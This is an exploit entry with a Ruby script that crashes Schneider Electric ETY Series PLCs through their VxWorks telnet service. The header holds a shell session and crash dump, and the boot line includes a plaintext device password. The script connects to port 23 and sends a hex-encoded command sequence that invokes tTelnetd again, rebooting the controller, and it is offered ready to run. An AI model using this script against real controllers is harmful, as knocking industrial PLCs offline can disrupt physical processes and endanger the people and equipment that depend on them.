####
# Telnet server of Schenider Electric ETY Series Controllers have a security problem. We noticed that while we are connected to the PLC through telnet, if we call telnet instance inside VxWorks again it can cause the device to crash. The telnet instance name is tTelnetd which you can see in the following line.
#-> version
#VxWorks (for VXW_370) version 5.4.
#Kernel: WIND version 2.5.
#Made on Mar 30 2005, 15:58:00.
#Boot line:
#fec(0,0) 192.168.2.1:C:\Manuf\Ety410\vxWorks h=192.168.2.1 e=192.168.2.100 u=ety pw=pass_ety tn=target
#value = 114 = 0x72 = 'r'
# -> tTelnetd
#
#Implementation Dependent Instruction TLB Miss
#Exception current instruction address: 0x58585858
#Machine Status Register: 0x08209032
#Condition Register: 0x44400040
#Task: 0xe31038 "tShell"
#0xced4b0 (LDMGR): 12/17/13 02:01:26 0 DVMGR DM: Reboot on exception. TID=C93568,
#IP = C931B8
#0xced4b0 (LDMGR): 12/17/13 02:01:26 0 LDMGR Fatal error:
#  specific code    1
#  error code      7cf
# file H:/ety/DeviceMgr/DeviceMgt.cpp line 2107
# Exploit Author: Arash Abedian (website: arashsec.com) (arash@arashsec.com)
# Contact: arash.ab@gmail.com
# Twitter: twitter.com/Arash_A_Amiri , bzq@yahoo.com
####
require 'socket'
host = "192.168.20.10"
sd = TCPSocket.new(host, 23)
trigger = "\x6e\x74\x70\x75\x70\x64\x61\x74\x65"+"\x0a\\x6e\x74\x70\x75\x70\x64\x61\x74\x65\x0a\x0a"+"\x63\x64\x20\x22\x2f\x46\x4c\x41\x53\x48\x30\x22\x0a\x0a"+"\x74\x54\x65\x6c\x6e\x65\x74\x64"
1.times { |p|
  puts "[+] Sending evil packet #{p + 1} ..."
  sleep(3)
  sd.write(trigger)
}
sd.close